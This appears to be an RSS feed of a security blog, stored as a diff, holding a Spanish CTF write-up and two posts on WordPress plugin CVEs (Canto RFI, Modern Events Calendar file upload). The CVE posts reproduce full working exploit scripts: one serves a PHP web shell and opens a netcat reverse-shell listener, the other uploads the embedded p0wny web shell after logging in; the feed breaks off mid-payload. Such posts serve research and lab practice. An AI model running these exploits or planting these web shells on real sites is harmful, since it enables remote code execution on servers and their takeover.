@@ -1,0 +1,1377 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Pylon</title><description>Blog</description><link>https://pylonet.pages.dev/</link><language>en</language><item><title>BorazuwarahCTF</title><link>https://pylonet.pages.dev/posts/borazuwarahctf/</link><guid isPermaLink="true">https://pylonet.pages.dev/posts/borazuwarahctf/</guid><description>En la maquina BorazuwarahCTF encontraremos una imagen en la web donde le aplicaremos estenografia para ver los metadatos de la imagen y descubrir un usuario donde le haremos fuerza bruta y abusaremos de SUDOERS para escalar privilegios.</description><pubDate>Wed, 12 Feb 2025 00:00:00 GMT</pubDate><content:encoded>&lt;hr /&gt;
+&lt;h1&gt;Reconocimiento&lt;/h1&gt;
+&lt;p&gt;Empezaremos con un &lt;strong&gt;escaneo nmap&lt;/strong&gt; para ver que puertos abiertos tiene:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p- --open -n -Pn -vvv 172.17.0.2
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-17 13:12 CEST
+Initiating ARP Ping Scan at 13:12
+Scanning 172.17.0.2 [1 port]
+Completed ARP Ping Scan at 13:12, 0.06s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 13:12
+Scanning 172.17.0.2 [65535 ports]
+Discovered open port 22/tcp on 172.17.0.2
+Discovered open port 80/tcp on 172.17.0.2
+Completed SYN Stealth Scan at 13:12, 0.93s elapsed (65535 total ports)
+Nmap scan report for 172.17.0.2
+Host is up, received arp-response (0.0000070s latency).
+Scanned at 2024-06-17 13:12:29 CEST for 1s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds
+           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Podremos ver que tiene el puerto &lt;strong&gt;22 ssh&lt;/strong&gt; y el puerto &lt;strong&gt;80 http&lt;/strong&gt;, haremos un segundo escaneo para ver que &lt;strong&gt;version y servicio&lt;/strong&gt; corren en los puertos:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p22,80 -sCV 172.17.0.2
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-17 13:14 CEST
+Nmap scan report for 172.17.0.2
+Host is up (0.000028s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 3d:fd:d7:c8:17:97:f5:12:b1:f5:11:7d:af:88:06:fe (ECDSA)
+|_  256 43:b3:ba:a9:32:c9:01:43:ee:62:d0:11:12:1d:5d:17 (ED25519)
+80/tcp open  http    Apache httpd 2.4.59 ((Debian))
+|_http-title: Site doesn&apos;t have a title (text/html).
+|_http-server-header: Apache/2.4.59 (Debian)
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Podremos ver lo siguiente:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Puerto&lt;/th&gt;
+&lt;th&gt;Info&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;22/tcp&lt;/td&gt;
+&lt;td&gt;SSH version 9.2&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;80/tcp&lt;/td&gt;
+&lt;td&gt;HTTP Apache version 2.4.59&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Si entramos a la web podremos ver que se trata de una web con una imagen de un huevo kinder:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h1&gt;Intrusión&lt;/h1&gt;
+&lt;p&gt;Nos descargaremos la imagen y con &lt;strong&gt;exiftool&lt;/strong&gt; veremos los &lt;strong&gt;metadatos&lt;/strong&gt; de la imagen:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/2.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;img/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podremos ver que obtuvimos un usuario llamado &lt;strong&gt;borazuwarah&lt;/strong&gt; pero desconocemos de la contraseña, asi que hare un ataque de fuerza bruta al &lt;em&gt;SSH&lt;/em&gt; con &lt;strong&gt;hydra&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/4.png&quot; alt=&quot;&quot; /&gt;
+&lt;em&gt;( emplee el diccionario rockyou.txt )&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Nos meteremos con esas credenciales al &lt;em&gt;SSH&lt;/em&gt;:&lt;/p&gt;
+&lt;h1&gt;Escala de Privilegios&lt;/h1&gt;
+&lt;p&gt;Si vemos los permisos &lt;strong&gt;sudoers&lt;/strong&gt; podremos ver que podemos usar &lt;strong&gt;/bin/bash&lt;/strong&gt; como usuario privilegiado &lt;em&gt;(root)&lt;/em&gt; sin necesidad de poner contraseña:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+</content:encoded></item><item><title>CVE-2023-3452 - Remote File Inclusion - Remote Code Execution - Unauthenticated</title><link>https://pylonet.pages.dev/posts/cve-2023-3452/</link><guid isPermaLink="true">https://pylonet.pages.dev/posts/cve-2023-3452/</guid><description>In this PoC we will see an Unauthenticated Remote File Inclusion(RFI) and Unauthenticated Remote Code Execution(RCE) that affects the Canto in versions prior to 3.0.5.</description><pubDate>Fri, 13 Sep 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;In this PoC we will see an &lt;strong&gt;Unauthenticated Remote File Inclusion&lt;/strong&gt; &lt;em&gt;(RFI)&lt;/em&gt; and &lt;strong&gt;Unauthenticated Remote Code Execution&lt;/strong&gt; &lt;em&gt;(RCE)&lt;/em&gt; that affects the &lt;strong&gt;Canto&lt;/strong&gt; in &lt;strong&gt;versions&lt;/strong&gt; &lt;strong&gt;prior&lt;/strong&gt; to &lt;strong&gt;3.0.5&lt;/strong&gt;&lt;/p&gt;
+&lt;h1&gt;What is Canto?&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&quot;https://wordpress.org/plugins/canto/&quot;&gt;Canto&lt;/a&gt; is an &lt;strong&gt;open source plugin&lt;/strong&gt;, a digital asset management software that organizes files and multimedia for businesses.&lt;/p&gt;
+&lt;h1&gt;Proof Of Content (PoC)&lt;/h1&gt;
+&lt;p&gt;This vulnerability affects the &lt;strong&gt;wp_abspath&lt;/strong&gt; parameter which can be found in the following line of &lt;strong&gt;includes/lib/download.php&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;***
+
+require_once($_REQUEST[&apos;wp_abspath&apos;] . &apos;/wp-admin/admin.php&apos;);
+
+***
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It must also be enabled in &lt;strong&gt;php.ini&lt;/strong&gt; &lt;strong&gt;allow_url_include&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Let&apos;s send a &lt;strong&gt;GET&lt;/strong&gt; request to a &lt;strong&gt;python&lt;/strong&gt; &lt;strong&gt;server&lt;/strong&gt; I have &lt;strong&gt;opened&lt;/strong&gt; on &lt;strong&gt;port&lt;/strong&gt; &lt;strong&gt;8881&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We can see that we have received from the &lt;strong&gt;GET&lt;/strong&gt; request to our python server, we can see that the call is made from &lt;strong&gt;/wp-admin/admin&lt;/strong&gt;**.php** , now instead of wanting to send us a request we are going to try to execute a command&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h1&gt;Exploit Usage&lt;/h1&gt;
+&lt;p&gt;We will use the script from this repo:&lt;/p&gt;
+&lt;p&gt;::github{repo=&quot;leoanggal1/CVE-2023-3452-PoC&quot;}&lt;/p&gt;
+&lt;p&gt;Here is the code:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Exploit Title: Wordpress Plugin Canto &amp;lt; 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)
+# Date: 04/11/2023
+# Exploit Author: Leopoldo Angulo (leoanggal1)
+# Vendor Homepage: https://wordpress.org/plugins/canto/
+# Software Link: https://downloads.wordpress.org/plugin/canto.3.0.4.zip
+# Version: All versions of Canto Plugin prior to 3.0.5
+# Tested on: Ubuntu 22.04, Wordpress 6.3.2, Canto Plugin 3.0.4
+# CVE : CVE-2023-3452
+
+#PoC Notes:
+#The Canto plugin for WordPress is vulnerable to Remote File Inclusion in versions up to, and including, 3.0.4 via the &apos;wp_abspath&apos; parameter. This allows unauthenticated attackers to include and execute arbitrary remote code on the server, provided that allow_url_include is enabled. (Reference: https://nvd.nist.gov/vuln/detail/CVE-2023-3452)
+#This code exploits the improper handling of the wp_abspath variable in the following line of the &quot;download.php&quot; code:
+#... require_once($_REQUEST[&apos;wp_abspath&apos;] . &apos;/wp-admin/admin.php&apos;); ...
+#This is just an example but there is this same misconfiguration in other lines of the vulnerable plugin files.
+# More information in Leoanggal1&apos;s Github
+
+#!/usr/bin/python3
+import argparse
+import http.server
+import socketserver
+import threading
+import requests
+import os
+import subprocess
+
+# Define the default web shell
+default_web_shell = &quot;&amp;lt;?php system($_GET[&apos;cmd&apos;]); ?&amp;gt;&quot;
+
+def create_admin_file(local_dir, local_shell=None):
+    if not os.path.exists(local_dir):
+        os.makedirs(local_dir)
+
+    # If a local shell is provided, use it; otherwise, use the default web shell
+    if local_shell:
+        with open(f&quot;{local_dir}/admin.php&quot;, &quot;wb&quot;) as admin_file:
+            with open(local_shell, &quot;rb&quot;) as original_file:
+                admin_file.write(original_file.read())
+    else:
+        with open(f&quot;{local_dir}/admin.php&quot;, &quot;w&quot;) as admin_file:
+            admin_file.write(default_web_shell)
+
+def start_local_server(local_port):
+    Handler = http.server.SimpleHTTPRequestHandler
+    httpd = socketserver.TCPServer((&quot;0.0.0.0&quot;, local_port), Handler)
+
+    print(f&quot;Local web server on port {local_port}...&quot;)
+    httpd.serve_forever()
+
+    return httpd
+
+def exploit_rfi(url, local_shell, local_host, local_port, command, nc_port):
+    local_dir = &quot;wp-admin&quot;
+    create_admin_file(local_dir, local_shell)
+
+    target_url = f&quot;{url}/wp-content/plugins/canto/includes/lib/download.php&quot;
+    local_server = f&quot;http://{local_host}:{local_port}&quot;
+    command = f&quot;cmd={command}&quot;
+
+    if local_shell:
+        # If a local shell is provided, start netcat on the specified port
+        subprocess.Popen([&quot;nc&quot;, &quot;-lvp&quot;, str(nc_port)])
+
+    server_thread = threading.Thread(target=start_local_server, args=(local_port,))
+    server_thread.daemon = True
+    server_thread.start()
+
+    exploit_url = f&quot;{target_url}?wp_abspath={local_server}&amp;amp;{command}&quot;
+    print(f&quot;Exploitation URL: {exploit_url}&quot;)
+
+    response = requests.get(exploit_url)
+    print(&quot;Server response:&quot;)
+    print(response.text)
+
+    # Shutdown the local web server
+    print(&quot;Shutting down local web server...&quot;)
+    server_thread.join()
+
+if __name__ == &quot;__main__&quot;:
+    examples = &apos;&apos;&apos;
+    Examples:
+    - Check the vulnerability
+    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33
+
+    - Execute a command
+    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -c &apos;id&apos;
+
+    - Upload and run a reverse shell file. You can download it from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php or generate it with msfvenom.
+    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -NC_PORT 3333 -s php-reverse-shell.php
+    &apos;&apos;&apos;
+    parser = argparse.ArgumentParser(description=&quot;Script to exploit the Remote File Inclusion vulnerability in the Canto plugin for WordPress - CVE-2023-3452&quot;, epilog=examples, formatter_class=argparse.RawDescriptionHelpFormatter)
+    parser.add_argument(&quot;-u&quot;, &quot;--url&quot;, required=True, default=None,  help=&quot;Vulnerable URL&quot;)
+    parser.add_argument(&quot;-s&quot;, &quot;--shell&quot;, help=&quot;Local file for web shell&quot;)
+    parser.add_argument(&quot;-LHOST&quot;, &quot;--local_host&quot;, required=True, help=&quot;Local web server IP&quot;)
+    parser.add_argument(&quot;-LPORT&quot;, &quot;--local_port&quot;, help=&quot;Local web server port&quot;)
+    parser.add_argument(&quot;-c&quot;, &quot;--command&quot;, default=&quot;whoami&quot;, help=&quot;Command to execute on the target&quot;)
+    parser.add_argument(&quot;-NC_PORT&quot;, &quot;--nc_port&quot;, type=int, help=&quot;Listener port for netcat&quot;)
+
+    try:
+        args = parser.parse_args()
+
+        if args.local_port is None:
+            args.local_port = 8080  # Valor predeterminado si LPORT no se proporciona
+        exploit_rfi(args.url, args.shell, args.local_host, int(args.local_port), args.command, args.nc_port)
+
+    except SystemExit:
+        parser.print_help()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;img//5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h1&gt;Lababoratory CVE-2023-3452&lt;/h1&gt;
+&lt;p&gt;I have created a machine that is currently uploaded to the &lt;a href=&quot;https://hackmyvm.eu/&quot;&gt;HackMyVM&lt;/a&gt; platform where you can touch this vulnerability&lt;/p&gt;
+&lt;p&gt;https://hackmyvm.eu/machines/machine.php?vm=Canto&lt;/p&gt;
+&lt;hr /&gt;
+</content:encoded></item><item><title>CVE-2021-24145 - Remote Code Execution (Authenticated)</title><link>https://pylonet.pages.dev/posts/cve-2021-24145/</link><guid isPermaLink="true">https://pylonet.pages.dev/posts/cve-2021-24145/</guid><description>This vulnerability allows us to give an arbitrary file upload in the Modern EventsCalendar Lite plugin in versions &lt; 5.16.5, this caused it to not correctly check the file being uploaded allowing PHP file uploads by the administrator using the csv or text content type.</description><pubDate>Thu, 12 Sep 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;This vulnerability allows us to give an arbitrary file upload in the &lt;a href=&quot;https://webnus.net/modern-events-calendar/&quot;&gt;Modern EventsCalendar&lt;/a&gt; Lite plugin in &lt;strong&gt;versions &amp;lt; 5.16.5&lt;/strong&gt;, this caused it to not correctly check the file being uploaded allowing &lt;strong&gt;PHP&lt;/strong&gt; &lt;strong&gt;file uploads&lt;/strong&gt; by the &lt;strong&gt;administrator&lt;/strong&gt; using the &lt;strong&gt;csv&lt;/strong&gt; or &lt;strong&gt;text&lt;/strong&gt; content type.&lt;/p&gt;
+&lt;h1&gt;Proof Of Content&lt;/h1&gt;
+&lt;p&gt;I am going to use the following code to exploit this vulnerability:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Exploit Title: Wordpress Plugin Modern Events Calendar 5.16.2 - Remote Code Execution (Authenticated)
+# Date 01.07.2021
+# Exploit Author: Ron Jost (Hacker5preme)
+# Vendor Homepage: https://webnus.net/modern-events-calendar/
+# Software Link: https://downloads.wordpress.org/plugin/modern-events-calendar-lite.5.16.2.zip
+# Version: Before 5.16.5
+# Tested on: Ubuntu 18.04
+# CVE: CVE-2021-24145
+# CWE: CWE-434
+# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24145/README.md
+
+&apos;&apos;&apos;
+Description:
+Arbitrary file upload in the Modern Events Calendar Lite WordPress plugin, versions before 5.16.5,
+did not properly check the imported file, allowing PHP ones to be uploaded by administrator by using the &apos;text/csv&apos;
+content-type in the request.
+&apos;&apos;&apos;
+
+
+&apos;&apos;&apos;
+Banner:
+&apos;&apos;&apos;
+banner = &quot;&quot;&quot;
+  ______     _______     ____   ___ ____  _      ____  _  _   _ _  _  ____  
+ / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \| || | / | || || ___| 
+| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | || |_| | || ||___ \ 
+| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/|__   _| |__   _|__) |
+ \____|  \_/  |_____|   |_____|\___/_____|_|    |_____|  |_| |_|  |_||____/ 
+                                
+                * Wordpress Plugin Modern Events Calendar Lite RCE                                                        
+                * @Hacker5preme
+                    
+&quot;&quot;&quot;
+print(banner)
+
+&apos;&apos;&apos;
+Import required modules:
+&apos;&apos;&apos;
+import requests
+import argparse
+
+&apos;&apos;&apos;
+User-Input:
+&apos;&apos;&apos;
+my_parser = argparse.ArgumentParser(description=&apos;Wordpress Plugin Modern Events Calenar Lite RCE (Authenticated)&apos;)
+my_parser.add_argument(&apos;-T&apos;, &apos;--IP&apos;, type=str)
+my_parser.add_argument(&apos;-P&apos;, &apos;--PORT&apos;, type=str)
+my_parser.add_argument(&apos;-U&apos;, &apos;--PATH&apos;, type=str)
+my_parser.add_argument(&apos;-u&apos;, &apos;--USERNAME&apos;, type=str)
+my_parser.add_argument(&apos;-p&apos;, &apos;--PASSWORD&apos;, type=str)
+args = my_parser.parse_args()
+target_ip = args.IP
+target_port = args.PORT
+wp_path = args.PATH
+username = args.USERNAME
+password = args.PASSWORD
+print(&apos;&apos;)
+
+&apos;&apos;&apos;
+Authentication:
+&apos;&apos;&apos;
+session = requests.Session()
+auth_url = &apos;http://&apos; + target_ip + &apos;:&apos; + target_port + wp_path + &apos;wp-login.php&apos;
+
+# Header:
+header = {
+    &apos;Host&apos;: target_ip,
+    &apos;User-Agent&apos;: &apos;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0&apos;,
+    &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;,
+    &apos;Accept-Language&apos;: &apos;de,en-US;q=0.7,en;q=0.3&apos;,
+    &apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,
+    &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;,
+    &apos;Origin&apos;: &apos;http://&apos; + target_ip,
+    &apos;Connection&apos;: &apos;close&apos;,
+    &apos;Upgrade-Insecure-Requests&apos;: &apos;1&apos;
+}
+
+# Body:
+body = {
+    &apos;log&apos;: username,
+    &apos;pwd&apos;: password,
+    &apos;wp-submit&apos;: &apos;Log In&apos;,
+    &apos;testcookie&apos;: &apos;1&apos;
+}
+
+# Authenticate:
+print(&apos;&apos;)
+auth = session.post(auth_url, headers=header, data=body)
+auth_header = auth.headers[&apos;Set-Cookie&apos;]
+if &apos;wordpress_logged_in&apos; in auth_header:
+    print(&apos;[+] Authentication successfull !&apos;)
+else:
+    print(&apos;[-] Authentication failed !&apos;)
+    exit()
+
+
+&apos;&apos;&apos;
+Exploit:
+&apos;&apos;&apos;
+exploit_url = &quot;http://&quot; + target_ip + &apos;:&apos; + target_port + wp_path + &quot;wp-admin/admin.php?page=MEC-ix&amp;amp;tab=MEC-import&quot;
+
+# Exploit Header:
+header = {
+    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0&quot;,
+    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;,
+    &quot;Accept-Language&quot;: &quot;de,en-US;q=0.7,en;q=0.3&quot;,
+    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
+    &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------29650037893637916779865254589&quot;,
+    &quot;Origin&quot;: &quot;http://&quot; + target_ip,
+    &quot;Connection&quot;: &quot;close&quot;,
+    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;
+}
+
+# Exploit Body: (using p0wny shell: https://github.com/flozz/p0wny-shell
+body = &quot;-----------------------------29650037893637916779865254589\r\nContent-Disposition: form-data; name=\&quot;feed\&quot;; filename=\&quot;shell.php\&quot;\r\nContent-Type: text/csv\r\n\r\n&amp;lt;?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\&quot;/^\\s*cd\\s*$/\&quot;, $cmd)) {\n        // pass\n    } elseif (preg_match(\&quot;/^\\s*cd\\s+(.+)\\s*(2&amp;gt;&amp;amp;1)?$/\&quot;, $cmd)) {\n        chdir($cwd);\n        preg_match(\&quot;/^\\s*cd\\s+([^\\s]+)\\s*(2&amp;gt;&amp;amp;1)?$/\&quot;, $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\&quot;/^\\s*download\\s+[^\\s]+\\s*(2&amp;gt;&amp;amp;1)?$/\&quot;, $cmd)) {\n        chdir($cwd);\n        preg_match(\&quot;/^\\s*download\\s+([^\\s]+)\\s*(2&amp;gt;&amp;amp;1)?$/\&quot;, $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \&quot;stdout\&quot; =&amp;gt; $stdout,\n        \&quot;cwd\&quot; =&amp;gt; getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\&quot;cwd\&quot; =&amp;gt; getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == &apos;cmd&apos;) {\n        $cmd = \&quot;compgen -c $fileName\&quot;;\n    } else {\n        $cmd = \&quot;compgen -f $fileName\&quot;;\n    }\n    $cmd = \&quot;/bin/bash -c \\\&quot;$cmd\\\&quot;\&quot;;\n    $files = explode(\&quot;\\n\&quot;, shell_exec($cmd));\n    return array(\n        &apos;files&apos; =&amp;gt; $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            &apos;stdout&apos; =&amp;gt; array(&apos;File not found / no read permission.&apos;),\n            &apos;cwd&apos; =&amp;gt; getcwd()\n        );\n    } else {\n        return array(\n            &apos;name&apos; =&amp;gt; basename($filePath),\n            &apos;file&apos; =&amp;gt; base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, &apos;wb&apos;);\n    if ($f === FALSE) {\n        return array(\n            &apos;stdout&apos; =&amp;gt; array(&apos;Invalid path / no write permission.&apos;),\n            &apos;cwd&apos; =&amp;gt; getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            &apos;stdout&apos; =&amp;gt; array(&apos;Done.&apos;),\n            &apos;cwd&apos; =&amp;gt; getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\&quot;feature\&quot;])) {\n\n    $response = NULL;\n\n    switch ($_GET[\&quot;feature\&quot;]) {\n        case \&quot;shell\&quot;:\n            $cmd = $_POST[&apos;cmd&apos;];\n            if (!preg_match(&apos;/2&amp;gt;/&apos;, $cmd)) {\n                $cmd .= &apos; 2&amp;gt;&amp;amp;1&apos;;\n            }\n            $response = featureShell($cmd, $_POST[\&quot;cwd\&quot;]);\n            break;\n        case \&quot;pwd\&quot;:\n            $response = featurePwd();\n            break;\n        case \&quot;hint\&quot;:\n            $response = featureHint($_POST[&apos;filename&apos;], $_POST[&apos;cwd&apos;], $_POST[&apos;type&apos;]);\n            break;\n        case &apos;upload&apos;:\n            $response = featureUpload($_POST[&apos;path&apos;], $_POST[&apos;file&apos;], $_POST[&apos;cwd&apos;]);\n    }\n\n    header(\&quot;Content-Type: application/json\&quot;);\n    echo json_encode($response);\n    die();\n}\n\n?&amp;gt;&amp;lt;!DOCTYPE html&amp;gt;\n\n&amp;lt;html&amp;gt;\n\n    &amp;lt;head&amp;gt;\n        &amp;lt;meta charset=\&quot;UTF-8\&quot; /&amp;gt;\n        &amp;lt;title&amp;gt;p0wny@shell:~#&amp;lt;/title&amp;gt;\n        &amp;lt;meta name=\&quot;viewport\&quot; content=\&quot;width=device-width, initial-scale=1.0\&quot; /&amp;gt;\n        &amp;lt;style&amp;gt;\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt &amp;gt; span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input &amp;gt; label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        &amp;lt;/style&amp;gt;\n\n        &amp;lt;script&amp;gt;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \&quot;\\n\\n\&quot;;\n                eShellContent.innerHTML += &apos;&amp;lt;span class=\\\&quot;shell-prompt\\\&quot;&amp;gt;&apos; + genPrompt(CWD) + &apos;&amp;lt;/span&amp;gt; &apos;;\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \&quot;\\n\&quot;;\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = &apos;&apos;;\n                } else {\n                    makeRequest(\&quot;?feature=shell\&quot;, {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty(&apos;file&apos;)) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\&quot;\\n\&quot;));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -&amp;gt; nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length &amp;lt;= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === &apos;cmd&apos;) {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\&quot;\\n\&quot;));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\&quot; \&quot;);\n                var type = (currentCmd.length === 1) ? \&quot;cmd\&quot; : \&quot;file\&quot;;\n                var fileName = (type === \&quot;cmd\&quot;) ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \&quot;?feature=hint\&quot;,\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            